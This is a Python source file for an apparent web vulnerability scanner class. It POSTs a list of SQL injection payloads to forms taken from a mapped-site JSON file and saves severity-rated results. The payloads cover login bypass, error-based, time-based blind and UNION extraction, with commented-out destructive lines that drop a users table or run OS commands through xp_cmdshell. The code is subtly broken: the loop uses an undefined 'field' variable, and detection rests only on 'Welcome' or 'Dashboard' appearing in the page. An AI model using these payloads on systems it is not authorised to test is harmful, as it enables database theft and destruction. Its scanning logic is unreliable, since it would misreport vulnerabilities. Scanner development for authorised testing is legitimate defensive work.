import requests
import json


class SQLInjectionScanner:
    """Class to scan for SQL Injection vulnerabilities in web forms."""

    PAYLOADS = [
        # Boolean-based
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 1=1#",
    
    # Error-based
    "' AND 1=CONVERT(int, (SELECT @@version)) --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(58,97,58), (SELECT database()), CHAR(58,98,58), FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) a) --",

    # Time-based blind
    "' OR SLEEP(5) --",
    "'; WAITFOR DELAY '00:00:05' --",
    "' AND IF(1=1, SLEEP(5), 0) --",
    "' AND 1=IF(1=1, SLEEP(5), 0) --",
    "'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END)--",

    # UNION-based
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, version() --",
    "' UNION SELECT 1, user() --",
    "' UNION SELECT 1, database() --",
    
    # Stacked queries (only works if the DB allows multiple queries) to dangerous to use, effects can be destructive. 
    #"'; DROP TABLE users; --", deletes user table
    #"'; SELECT pg_sleep(5); --", Postgres sleep, blind test
    #"'; EXEC xp_cmdshell('whoami'); --", OS command execution (MSSQL) | High | Dangerous – system command

    # Generic payloads
    "\" OR \"\" = \"",
    "') OR ('1'='1",
    "admin' --",
    "admin') --",
    "' OR '' = '"
    ]

    SEVERITY = {
        "High": "SQL Injection is critical and can lead to complete database compromise.",
        "Medium": "Possible vulnerability but might be harder to exploit.",
        "Low": "Minor issue with SQL query, unlikely to be exploitable.",
        "Safe": "No SQL Injection vulnerabilities detected on this page."
    }

    def __init__(self, mapped_data_file="scan_engine/scanner/mapped_data.json", results_file="scan_engine/reports/scan_results_json/sql_injection.json"):
        self.mapped_data_file = mapped_data_file
        self.results_file = results_file
        self.scan_results = {}

    def load_mapped_data(self):
        """Load mapped website data from JSON file."""
        try:
            with open(self.mapped_data_file, "r") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"⚠️ Error loading JSON file: {e}")
            return None

    def detect_sql_injection(self, target_url, form):
        """Test SQL Injection vulnerabilities for a given form."""
        print(f"\n🔍 Testing form at: {target_url}")

        input_fields = form.get("inputs",{}) # fuzzing through all the inputs
        sql_injection_found = False  # ✅ Flag to track vulnerability detection

        base_data = {field: "test" for field in input_fields}

        for payload in self.PAYLOADS:
            test_data = base_data.copy()
            test_data[field] = payload
            print(f"🛠️  Testing payload: {payload}")

            try:
                response = requests.post(target_url, data=test_data, timeout=10)

                if response.status_code == 200 and ("Welcome" in response.text or "Dashboard" in response.text):
                    print(f"  ⚠️ Possible SQL Injection Detected at {target_url}!")
                    print(f"  🔹 Vulnerable payload: {payload} in field: {field}")

                    if target_url not in self.scan_results:
                        self.scan_results[target_url] = []

                    severity = "High"

                    self.scan_results[target_url].append({
                        "payload": payload,
                        "vulnerable": True,
                        "severity": severity,
                        "severity_description": self.SEVERITY[severity]
                    })

                    sql_injection_found = True  #Set flag to True if SQLi is detected
                    break 

            except requests.RequestException as e:
                print(f"  ❌ Error: {e}")

        if not sql_injection_found:
            print(f"✅ No SQL Injection vulnerabilities found at {target_url}. Marking as Safe.")
            self.scan_results[target_url] = [{
                "vulnerable": False,
                "severity": "Safe",
                "severity_description": self.SEVERITY["Safe"]
            }]

    def save_scan_results(self):
        """Save scan results to a JSON file without overwriting previous results."""
        try:
            with open(self.results_file, "r") as f:
                previous_results = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            previous_results = {}

        if "scans" not in previous_results:
            previous_results["scans"] = {}

        previous_results["scans"][self.__class__.__name__] = self.scan_results

        with open(self.results_file, "w") as f:
            json.dump(previous_results, f, indent=4)

        print("\n✅ SQL Injection scan complete! Results saved in sql_injection.json")

    def run(self):
        """Run the SQL Injection scanner."""
        print("\n🚀 Scanning for SQL Injection vulnerabilities...\n")

        mapped_data = self.load_mapped_data()
        if not mapped_data:
            print("❌ No mapped data found. Exiting SQL injection scan.")
            return False

        for page in mapped_data.get("pages", []):
            for form in page.get("forms", []):
                if form.get("method", "").upper() == "POST" and "inputs" in form and isinstance(form["inputs"], dict) and form["inputs"]:
                    self.detect_sql_injection(form["action"], form)

        self.save_scan_results()
        return True
